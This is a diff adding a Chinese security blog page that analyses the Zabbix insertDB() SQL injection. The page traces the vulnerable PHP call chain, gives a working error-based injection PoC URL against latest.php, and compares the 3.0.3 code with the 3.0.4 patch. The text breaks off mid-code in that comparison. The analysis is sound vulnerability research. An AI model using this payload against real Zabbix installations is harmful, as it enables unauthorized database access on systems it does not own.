@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="DshtAnger" />
+
+
+
+<meta name="description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安&amp;gt;全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。
+由于insertDB()函数对可控参数过滤不当，导致SQL注入
+攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zabbix insertDB()注入漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2016/08/15/Zabbix_insertDB_Injection/index.html">
+<meta property="og:site_name" content="DshtAnger">
+<meta property="og:description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安&amp;gt;全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。
+由于insertDB()函数对可控参数过滤不当，导致SQL注入
+攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令">
+<meta property="og:image" content="https://www.zabbix.com/documentation/3.0/_media/manual/installation/install_2.png">
+<meta property="og:updated_time" content="2016-10-11T16:07:39.024Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Zabbix insertDB()注入漏洞分析">
+<meta name="twitter:description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安&amp;gt;全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。
+由于insertDB()函数对可控参数过滤不当，导致SQL注入
+攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令">
+<meta name="twitter:image" content="https://www.zabbix.com/documentation/3.0/_media/manual/installation/install_2.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="DshtAnger" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Zabbix insertDB()注入漏洞分析 | DshtAnger</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/hacker.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">DshtAnger</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">To Be A Hacker</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/DshtAnger" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:568274449@qq.com" title="Email"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">DshtAnger</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/hacker.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">DshtAnger</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">To Be A Hacker</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/DshtAnger" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:568274449@qq.com" title="Email"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Zabbix_insertDB_Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/15/Zabbix_insertDB_Injection/" class="article-date">
+      <time datetime="2016-08-15T15:25:06.000Z" itemprop="datePublished">2016-08-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Zabbix insertDB()注入漏洞分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安&gt;全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。</p>
+<p>由于<code>insertDB()</code>函数对可控参数过滤不当，导致SQL注入</p>
+<p>攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令</p>
+<a id="more"></a>
+<h1 id="Zabbix-insertDB-注入漏洞分析"><a href="#Zabbix-insertDB-注入漏洞分析" class="headerlink" title="Zabbix insertDB()注入漏洞分析"></a>Zabbix insertDB()注入漏洞分析</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。</p>
+<p>由于<code>insertDB()</code>函数对可控参数过滤不当，导致SQL注入。</p>
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令。  </p>
+<h3 id="3-漏洞触发条件"><a href="#3-漏洞触发条件" class="headerlink" title="3. 漏洞触发条件"></a>3. 漏洞触发条件</h3><p>版本：<code>2.0.x</code>、<code>2.2.x</code>、<code>2.4.x</code>、<code>2.5</code>、<code>3.0.0-3.0.3</code><br>登陆：以下两种触发方式，都需要系统未关闭默认开启的guest账户登陆，或者拥有其他可登陆的账户。</p>
+<h2 id="二、漏洞复现（以3-0-3为例）"><a href="#二、漏洞复现（以3-0-3为例）" class="headerlink" title="二、漏洞复现（以3.0.3为例）"></a>二、漏洞复现（以3.0.3为例）</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>Docker<br>ubuntu 14.04<br>zabbix <code>3.0.3</code> 源码编译安装</p>
+<p><code>tar -zxvf zabbix-3.0.3.tar.gz</code>  </p>
+<p><code>cd zabbix-3.0.3/database/mysql</code></p>
+<p>配置数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">shell&gt; mysql -uroot -p&lt;password&gt;</div><div class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</div><div class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;</div><div class="line">mysql&gt; quit;</div><div class="line">shell&gt; mysql -uzabbix -pzabbix zabbix &lt; schema.sql</div><div class="line"># stop here if you are creating database for Zabbix proxy</div><div class="line">shell&gt; mysql -uzabbix -p&lt;password&gt; zabbix &lt; images.sql</div><div class="line">shell&gt; mysql -uzabbix -p&lt;password&gt; zabbix &lt; data.sql</div></pre></td></tr></table></figure></p>
+<p>编译：<br><code>./configure --enable-server --enable-agent --enable-java --with-unixodbc --with-mysql --with-libcurl --with-libxml2 --with-openssl --with-net-snmp --with-ldap</code></p>
+<p>编译过程可能遇到如下依赖问题：  </p>
+<ol>
+<li><p>configure: error: MySQL library not found<br><code>apt-get install libmysqld-dev</code></p>
+</li>
+<li><p>configure: error: unixODBC library not found<br><code>apt-get install unixodbc-dev</code></p>
+</li>
+<li><p>configure: error: Curl library not found<br><code>apt-get install libcurl3-dev</code></p>
+</li>
+<li><p>configure: error: Unable to find “javac”executable in path<br><code>apt-get install openjdk-7-jdk</code></p>
+</li>
+<li><p>configure: error: Invalid Net-SNMP directory - unableto find net-snmp-config<br><code>apt-get install libsnmp-dev,snmp</code></p>
+</li>
+<li><p>configure: error: Invalid LDAP directory - unable tofind ldap.h<br><code>apt-getinstall libldap2-dev</code></p>
+</li>
+</ol>
+<p>安装：<br><code>make install</code></p>
+<p>修改zabbix server配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># vi /etc/zabbix/zabbix_server.conf</div><div class="line">DBHost=localhost</div><div class="line">DBName=zabbix</div><div class="line">DBUser=zabbix</div><div class="line">DBPassword=zabbix</div></pre></td></tr></table></figure></p>
+<p>前端配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># vi /etc/apache2/conf-enabled/zabbix.conf</div><div class="line">php_value max_execution_time 300</div><div class="line">php_value memory_limit 128M</div><div class="line">php_value post_max_size 16M</div><div class="line">php_value upload_max_filesize 2M</div><div class="line">php_value max_input_time 300</div><div class="line">php_value always_populate_raw_post_data -1</div><div class="line">php_value date.timezone Asia/Shanghai</div></pre></td></tr></table></figure></p>
+<p>安装前端：<br>在浏览器打开，http:/<ip>/zabbix按提示进行安装<br><img src="https://www.zabbix.com/documentation/3.0/_media/manual/installation/install_2.png" alt=""></ip></p>
+<h3 id="2-漏洞函数分析"><a href="#2-漏洞函数分析" class="headerlink" title="2. 漏洞函数分析"></a>2. 漏洞函数分析</h3><p>该漏洞函数为<code>CProfile.php</code>中277行的<code>insertDB()</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line"></div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，可控变量，未用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line"></div><div class="line">	<span class="keyword">return</span> DBexecute(<span class="string">'INSERT INTO profiles ('</span>.implode(<span class="string">', '</span>, array_keys($values)).<span class="string">') VALUES ('</span>.implode(<span class="string">', '</span>, $values).<span class="string">')'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>zbx_dbstr()</code>实际上就是<code>mysql_real_escape_string()</code>，会对单引号、双引号等特殊字符做转义<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">zbx_dbstr</span><span class="params">($var)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">switch</span> ($DB[<span class="string">'TYPE'</span>]) &#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> ZBX_DB_MYSQL:</div><div class="line">		<span class="keyword">if</span> (is_array($var)) &#123;</div><div class="line">			<span class="keyword">foreach</span> ($var <span class="keyword">as</span> $vnum =&gt; $value) &#123;</div><div class="line">				$var[$vnum] = <span class="string">"'"</span>.mysqli_real_escape_string($DB[<span class="string">'DB'</span>], $value).<span class="string">"'"</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> $var;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="string">"'"</span>.mysqli_real_escape_string($DB[<span class="string">'DB'</span>], $var).<span class="string">"'"</span>;</div></pre></td></tr></table></figure></p>
+<p><code>insertDB()</code>调用<code>db.inc.php</code>中499行的<code>DBexecute()</code>也没有进行过滤，直接执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">DBexecute</span><span class="params">($query, $skip_error_messages = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> ZBX_DB_MYSQL:</div><div class="line">	<span class="comment">//关键点，未过滤，直接执行查询函数</span></div><div class="line">	<span class="keyword">if</span> (!$result = mysqli_query($DB[<span class="string">'DB'</span>], $query)) &#123;</div><div class="line">		error(<span class="string">'Error in query ['</span>.$query.<span class="string">'] ['</span>.mysqli_error($DB[<span class="string">'DB'</span>]).<span class="string">']'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">break</span>;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>注意<code>$idx2</code>可控，未被过滤，为第4个参数</p>
+<h3 id="3-latest-php页面漏洞触发分析"><a href="#3-latest-php页面漏洞触发分析" class="headerlink" title="3. latest.php页面漏洞触发分析"></a>3. latest.php页面漏洞触发分析</h3><h4 id="3-1-漏洞代码分析"><a href="#3-1-漏洞代码分析" class="headerlink" title="3.1 漏洞代码分析"></a>3.1 漏洞代码分析</h4><p><code>latest.php</code>中，70行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (hasRequest(<span class="string">'favobj'</span>)) &#123;</div><div class="line">	<span class="keyword">if</span> ($_REQUEST[<span class="string">'favobj'</span>] == <span class="string">'toggle'</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (!is_array($_REQUEST[<span class="string">'toggle_ids'</span>])) &#123;</div><div class="line">			<span class="keyword">if</span> ($_REQUEST[<span class="string">'toggle_ids'</span>][<span class="number">1</span>] == <span class="string">'_'</span>) &#123;</div><div class="line">				$hostId = substr($_REQUEST[<span class="string">'toggle_ids'</span>], <span class="number">2</span>);</div><div class="line">				CProfile::update(<span class="string">'web.latest.toggle_other'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $hostId);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> &#123;</div><div class="line">				$applicationId = $_REQUEST[<span class="string">'toggle_ids'</span>];</div><div class="line">				CProfile::update(<span class="string">'web.latest.toggle'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $applicationId);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">foreach</span> ($_REQUEST[<span class="string">'toggle_ids'</span>] <span class="keyword">as</span> $toggleId) &#123;</div><div class="line">				<span class="keyword">if</span> ($toggleId[<span class="number">1</span>] == <span class="string">'_'</span>) &#123;</div><div class="line">					$hostId = substr($toggleId, <span class="number">2</span>);</div><div class="line">					CProfile::update(<span class="string">'web.latest.toggle_other'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $hostId);</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> &#123;</div><div class="line">					$applicationId = $toggleId;</div><div class="line">					CProfile::update(<span class="string">'web.latest.toggle'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $applicationId);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>提交参数<code>favobj=toggle</code>时传入的数组参数<code>toggle_ids</code>总是能进入<code>CProfile::update()</code>中的第4个参数，跟进<code>CProfile.php</code>中209行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($idx, $value, $type, $idx2 = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">if</span> (is_null($current)) &#123;</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$insert[$idx])) &#123;</div><div class="line">			<span class="keyword">self</span>::$insert[$idx] = [];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">self</span>::$insert[$idx][$idx2] = $profile;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> ($current != $value) &#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$update[$idx])) &#123;</div><div class="line">				<span class="keyword">self</span>::$update[$idx] = [];</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">self</span>::$update[$idx][$idx2] = $profile;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$profiles[$idx])) &#123;</div><div class="line">		<span class="keyword">self</span>::$profiles[$idx] = [];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">self</span>::$profiles[$idx][$idx2] = $value;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>update()</code>对一系列成员变量进行赋值更新  </p>
+<p><strong>传入的<code>toggle_ids</code>成为<code>$idx2</code>这个变量，该变量可控</strong>  </p>
+<p>回到<code>latest.php</code>中99行，<code>page_footer.php</code>被包含进来执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((PAGE_TYPE_JS == $page[<span class="string">'type'</span>]) || (PAGE_TYPE_HTML_BLOCK == $page[<span class="string">'type'</span>]))&#123;</div><div class="line">	<span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/page_footer.php'</span>;</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>跟进到<code>page_footer.php</code>，38行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (CProfile::isModified()) &#123;</div><div class="line">	DBstart();</div><div class="line">	$result = CProfile::flush();</div><div class="line">	DBend($result);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>跟到<code>CProfile.php</code>中，<code>isModified()</code>定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isModified</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">self</span>::$insert || <span class="keyword">self</span>::$update);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p><code>latest.php</code>中70行代码块调用<code>CProfile::update()</code>对<code>$insert</code><br>、<code>$update</code>等进行赋值，所以该<code>latest.php</code>会执行到上面的if语句块中  </p>
+<p>if语句块中第二句调用<code>CProfile::flush()</code>，从<code>CProfile::$insert</code>中取出相应的值，并进行insertDB操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">flush</span><span class="params">()</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">foreach</span> (<span class="keyword">self</span>::$insert <span class="keyword">as</span> $idx =&gt; $profile) &#123;</div><div class="line">		<span class="keyword">foreach</span> ($profile <span class="keyword">as</span> $idx2 =&gt; $data) &#123;</div><div class="line">			$result &amp;= <span class="keyword">self</span>::insertDB($idx, $data[<span class="string">'value'</span>], $data[<span class="string">'type'</span>], $idx2);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	......</div><div class="line">	<span class="keyword">return</span> $result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>最终调用了存在SQL注入的<code>insertDB()</code>，<code>$idx2</code>可控</p>
+<p>总结调用流程：<br><code>latest.php: $_REQUEST[&#39;toggle_ids&#39;]   ---&gt;    CProfile::update()   ---&gt;    require_once()   ---&gt;   CProfile::flush()   ---&gt;   CProfile::insertDB()   ---&gt;   CProfile::DBexecute()</code></p>
+<p>PoC:<br>需要在登陆的时候抓包取得sid，或者从登陆后的页面源码中取得sid(仅3.0.x适用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../zabbix/latest.php?output=ajax&amp;sid=b5ddf30e6b2e5899&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=6666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23</div></pre></td></tr></table></figure></p>
+<h4 id="3-2-补丁对比"><a href="#3-2-补丁对比" class="headerlink" title="3.2 补丁对比"></a>3.2 补丁对比</h4><p>zabbix 最新版3.0.4中，删除了<code>latest.php</code>从外部获取<code>toggle_ids</code>的代码，没有了可控的参数，这个点已经<code>无法注入</code></p>
+<p>同时修复了<code>CProfile::insertDB()</code>的缺陷，增加了对<code>$idx2</code>的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.3 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，未进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.4 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div 